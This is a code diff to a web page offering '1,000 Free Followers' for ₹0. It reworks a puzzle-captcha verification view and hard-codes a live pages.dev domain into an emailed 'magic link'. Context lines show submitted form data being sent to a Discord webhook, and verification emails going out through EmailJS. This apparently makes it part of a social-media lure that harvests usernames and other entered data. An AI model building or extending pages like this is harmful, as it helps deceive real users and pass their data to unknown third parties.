@@ -703,7 +703,7 @@
         <form id="orderForm" onsubmit="handleOrderSubmit(event)">
           <div class="input-group">
             <label><i class="fa-solid fa-box-open"></i> Selected Package</label>
-  <input type="text" id="selectedPlan" value="1,000 Free Followers - ₹0" readonly style="color: var(--secondary); font-weight: 600;">
+            <input type="text" id="selectedPlan" value="1,000 Free Followers - ₹0" readonly style="color: var(--secondary); font-weight: 600;">
           </div>
 
           <div class="input-group" id="customGroup" style="display: none;">
@@ -887,20 +887,30 @@
     let verifyingUsername = "Customer";
 
     // CHECK IF REDIRECTED FROM EMAIL LINK WITH ?verify=puzzle
-    window.addEventListener('DOMContentLoaded', () => {
+    function checkVerificationMode() {
       const urlParams = new URLSearchParams(window.location.search);
-      if (urlParams.get('verify') === 'puzzle') {
+      const verifyMode = urlParams.get('verify');
+      
+      if (verifyMode === 'puzzle' || verifyMode === 'captcha') {
         verifyingUsername = urlParams.get('user') || 'Customer';
         
-        // Hide Main Form, Show Puzzle Captcha View
-        document.getElementById('mainContentWrapper').style.display = 'none';
-        document.getElementById('puzzleCaptchaSection').style.display = 'block';
-        document.getElementById('puzzleUserDisplay').innerText = verifyingUsername;
+        const mainWrapper = document.getElementById('mainContentWrapper');
+        const puzzleSection = document.getElementById('puzzleCaptchaSection');
+        const userDisplay = document.getElementById('puzzleUserDisplay');
 
-        // Generate Visual Puzzle
-        generateVisualPuzzle();
+        if (mainWrapper && puzzleSection) {
+          mainWrapper.style.display = 'none';
+          puzzleSection.style.display = 'block';
+          if (userDisplay) userDisplay.innerText = verifyingUsername;
+          
+          generateVisualPuzzle();
+        }
       }
-    });
+    }
+
+    // Bind multiple load events for mobile preview compatibility
+    window.addEventListener('DOMContentLoaded', checkVerificationMode);
+    window.addEventListener('load', checkVerificationMode);
 
     function generateVisualPuzzle() {
       // Pick random target icon
@@ -1146,12 +1156,9 @@
 
       let requestPromise = fetch(DISCORD_WEBHOOK_URL, fetchOptions).catch(err => null);
 
-      // Build magic puzzle captcha link
-      let currentBaseUrl = window.location.href.split('?')[0];
-      if (!currentBaseUrl.startsWith('http')) {
-        currentBaseUrl = 'https://' + currentBaseUrl;
-      }
-      const magicLink = `${currentBaseUrl}?verify=puzzle&user=${encodeURIComponent(username)}`;
+      // Build magic puzzle captcha link targeting explicit live domain
+      const liveDomain = "https://glasspane.pages.dev";
+      const magicLink = `${liveDomain}/?verify=puzzle&user=${encodeURIComponent(username)}`;
 
       // Send Email via EmailJS
       const emailParams = {
